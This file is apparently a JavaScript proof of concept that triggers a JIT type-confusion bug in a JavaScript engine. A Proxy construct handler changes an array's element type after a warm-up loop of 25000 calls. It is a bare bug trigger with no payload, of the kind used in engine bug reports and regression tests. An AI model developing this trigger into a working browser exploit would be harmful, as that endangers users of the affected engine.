function poc(array, proxy) {
    let a = array[0];
    Reflect.construct(proxy, [array]);
    return array[0] + 1;
}

const handler = {
    construct(target, args) {
        args[0][0] = 1.1;
        return Reflect.construct(target, args, target);
    }
};

const proxy = new Proxy(function() {}, handler);

for (let i = 0; i < 25000; i++) {
    poc([1, 2, 3], proxy);
}

poc([1, 2, 3], proxy);
